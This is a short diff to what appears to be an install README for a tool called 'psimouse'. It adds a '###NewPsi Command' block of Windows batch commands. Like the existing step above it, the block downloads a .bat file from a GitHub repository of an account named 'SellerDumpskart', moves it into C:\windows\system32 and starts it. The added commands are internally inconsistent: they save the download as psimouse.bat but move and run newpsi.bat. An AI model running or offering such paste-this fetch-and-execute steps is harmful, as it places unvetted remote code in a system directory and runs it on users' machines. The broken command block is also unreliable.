@@ -38,6 +38,12 @@ curl -L -o "%TEMP%\psimouse.bat" "https://github.com/SellerDumpskart/psimouse/ra
 move /Y "%TEMP%\psimouse.bat" "C:\windows\system32\psimouse.bat"
 start "" "C:\windows\system32\psimouse.bat"
 ```
+###NewPsi Command
+```bat
+curl -L -o "%TEMP%\psimouse.bat" "https://github.com/SellerDumpskart/psimouse/raw/refs/heads/main/newpsi.bat"
+move /Y "%TEMP%\newpsi.bat" "C:\windows\system32\newpsi.bat"
+start "" "C:\windows\system32\newpsi.bat"
+```
 
 ### Quick Install (PowerShell)
 
